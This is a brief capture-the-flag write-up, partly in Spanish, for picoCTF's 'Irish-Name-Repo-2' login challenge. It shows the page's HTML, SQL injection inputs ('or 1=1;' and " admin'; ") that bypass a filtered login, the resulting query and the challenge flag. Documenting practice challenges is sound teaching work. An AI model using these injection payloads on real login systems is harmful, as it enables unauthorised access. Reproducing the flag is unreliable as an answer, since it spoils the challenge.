# Irish-Name-Repo-2
## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/53751/` ([link](https://jupiter.challenges.picoctf.org/problem/53751/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:53751
## Pistas
P1:The password is being filtered.
P2:
## Datos de acceso al nivel
```bash
Usuario: Dena
Contraseña: Notedigo
```
## Solución
```bash
Pass siguiente lvl: picoCTF{m0R3_SQL_plz_c34df170}
----------------------------------------------------
|   |   |
|---|---|
||<!doctype html>|
||<html>|
||<head>|
||<title>Login</title>|
||<link rel="stylesheet" type="text/css" href="[//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css](https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css)">|
||</head>|
||<body>|
||<div class="container">|
||<div class="row">|
||<div class="col-md-12">|
||<div class="panel panel-primary" style="margin-top:50px">|
||<div class="panel-heading">|
||<h3 class="panel-title">Log In</h3>|
||</div>|
||<div class="panel-body">|
||<form action="login.php" method="POST">|
||<fieldset>|
||<div class="form-group">|
||<label for="username">Username:</label>|
||<input type="text" id="username" name="username" class="form-control">|
||</div>|
||<div class="form-group">|
||<label for="password">Password:</label>|
||<div class="controls">|
||<input type="password" id="password" name="password" class="form-control">|
||</div>|
||</div>|
||<input type="hidden" name="debug" value="0">|
|||
||<div class="form-actions">|
||<input type="submit" value="Login" class="btn btn-primary">|
||</div>|
||</fieldset>|
||</form>|
||</div>|
||</div>|
||</div>|
||</div>|
||</div>|
||</body>|
||</html>|
|||
----------------------------------------------------
username: or 1 =1;'
password: or 1=1;
SQL query: SELECT * FROM users WHERE name='or 1 =1;'' AND password='or 1=1;'

# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_c34df170}
```
## Notas Adicionales
pudo solucionarse solo poniendo " admin'; " en el campo de usr, ignora el resto de elementos de la pass

| Comando  | Descripción | 
|------------|--------------|

## Referencias 
